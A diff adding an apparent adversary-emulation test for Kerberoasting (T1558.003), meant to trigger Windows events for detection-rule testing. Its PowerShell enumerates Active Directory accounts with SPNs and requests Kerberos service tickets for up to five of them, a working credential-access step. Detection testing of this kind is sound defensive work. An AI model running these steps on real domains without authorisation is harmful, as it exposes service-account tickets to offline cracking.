@@ -1,0 +1,70 @@
+id: T1558.003
+name: Kerberoasting — Service Ticket Request
+description: Requests Kerberos service tickets for accounts with SPNs registered, simulating Kerberoasting reconnaissance. Generates Event 4769 (Kerberos service ticket request) — Exabeam has 22 rules for this technique.
+tactic: credential-access
+technique_id: T1558.003
+platform: windows
+phase: attack
+elevation_required: false
+expected_events:
+  - "4769 (Kerberos service ticket request — key Kerberoasting indicator)"
+  - "4768 (Kerberos TGT request)"
+  - "4688 (powershell.exe process creation)"
+  - "4104 (PowerShell ScriptBlock - SPN enumeration)"
+tags:
+  - credential-access
+  - kerberos
+  - no-prereqs
+executor:
+  type: powershell
+  command: |
+    Write-Host "[T1558.003] Kerberoasting - Service Principal Name enumeration and ticket request"
+
+    # Step 1: Enumerate accounts with SPNs (AD reconnaissance for Kerberoasting targets)
+    Write-Host "--- Step 1: SPN Enumeration (LDAP query for kerberoastable accounts) ---"
+    try {
+        $spnAccounts = ([ADSISearcher]"(&(objectCategory=user)(servicePrincipalName=*))").FindAll()
+        if ($spnAccounts.Count -gt 0) {
+            Write-Host "Found $($spnAccounts.Count) account(s) with SPNs registered:"
+            foreach ($acc in $spnAccounts) {
+                $sam = $acc.Properties["samaccountname"][0]
+                $spns = $acc.Properties["serviceprincipalname"]
+                Write-Host "  User: $sam | SPNs: $($spns -join ', ')"
+            }
+        } else {
+            Write-Host "No SPN accounts found (likely not domain-joined). Simulating with computer SPNs."
+        }
+    } catch {
+        Write-Host "LDAP SPN query failed (not domain-joined or insufficient access): $_"
+    }
+
+    # Step 2: Request service tickets for discovered SPNs (generates Event 4769)
+    Write-Host "--- Step 2: Requesting Kerberos service tickets for SPNs ---"
+    try {
+        $spns = ([ADSISearcher]"(&(objectCategory=user)(servicePrincipalName=*))").FindAll() |
+                ForEach-Object { $_.Properties["serviceprincipalname"] } |
+                Where-Object { $_ -notmatch "^kadmin" }
+        if ($spns) {
+            foreach ($spn in ($spns | Select-Object -First 5)) {
+                Write-Host "  Requesting ticket for SPN: $spn"
+                Add-Type -AssemblyName System.IdentityModel
+                try {
+                    $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
+                    Write-Host "  Ticket obtained: $($ticket.Id) — Event 4769 generated"
+                } catch {
+                    Write-Host "  Ticket request failed for $spn`: $_"
+                }
+            }
+        } else {
+            Write-Host "No domain SPNs available. On domain-joined system Event 4769 would fire here."
+        }
+    } catch {
+        Write-Host "Kerberos ticket request phase: $_"
+    }
+
+    # Step 3: klist to show cached tickets (generates 4104 ScriptBlock log)
+    Write-Host "--- Step 3: Listing cached Kerberos tickets (klist) ---"
+    klist 2>&1 | Select-String -Pattern "Service|Principal|Ticket" | Select-Object -First 10
+
+    Write-Host "[T1558.003] Complete. Event 4769 generated for each SPN ticket request (domain systems)."
+cleanup: ""
